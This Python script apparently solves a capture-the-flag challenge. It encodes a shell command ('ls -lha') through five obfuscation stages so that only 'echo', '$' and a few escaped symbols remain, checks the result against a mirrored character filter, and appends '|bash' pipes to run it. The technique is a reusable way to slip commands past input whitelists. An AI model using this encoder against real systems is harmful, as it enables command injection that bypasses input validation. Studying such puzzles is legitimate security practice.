def escape(payload):
    # escape special characters
    enc = lambda c: "\\" + c if c in "+=$()';\\" else c
    return "".join(
        [enc(c) for c in payload]
    )

def stage1(payload):
    # convert to char code
    return "echo $'" + "".join(
        ['\\' + oct(ord(c))[1:] for c in payload]
    ) + "'"

def stage2(payload):
    # escape digits
    payload = escape(payload)
    def enc(c):
        if c in "0123456789":
            if c == "0":
                # 11==1
                return "$(($echo$echo==$echo))"
            else:
                # 1+1+1+...
                return "$((" + "+".join(["$echo" for i in range(int(c))]) + "))"
        else:
            return c
    return "echo=$(($$==$$)); echo " + "".join(
        [enc(c) for c in payload]
    )

def stage3(payload):
    # Escape ', (, ), +
    payload = escape(payload)
    payload = payload.replace("\\'", "$echoecho")
    payload = payload.replace("\\(", "$echoechoecho")
    payload = payload.replace("\\)", "$echoechoechoecho")
    payload = payload.replace("\\+", "$echoechoechoechoecho")
    return "echoecho=\\'; echoechoecho=\\(; echoechoechoecho=\\); echoechoechoechoecho=\\+; echo " + payload

def stage4(payload):
    # Escape ;
    payload = escape(payload)
    payload = payload.replace("\\;", "$echoechoechoechoechoecho")
    return "echoechoechoechoechoecho=\\;; echo " + payload

def stage5(payload):
    # Escape =
    payload = escape(payload)
    payload = payload.replace("\\=", "$echoechoechoechoechoechoecho")
    return "echoechoechoechoechoechoecho=\\=; echo " + payload

import re

def check_input(payload):
    if payload == 'thisfile':
        print(open("/bin/shell").read())

    if not all(ord(c) < 128 for c in payload):
        print("ERROR ascii only pls")

    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        print("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        print("ERROR Too many special chars.")

    return payload

from subprocess import check_output

payload = 'ls -lha'
payload = stage1(payload)
payload = stage2(payload)
payload = stage3(payload)
payload = stage4(payload)
payload = stage5(payload)
check_input(payload)
print(payload)
payload += "|bash" * 5
#result = check_output(payload, shell=True, executable="/bin/bash")
#print(result)
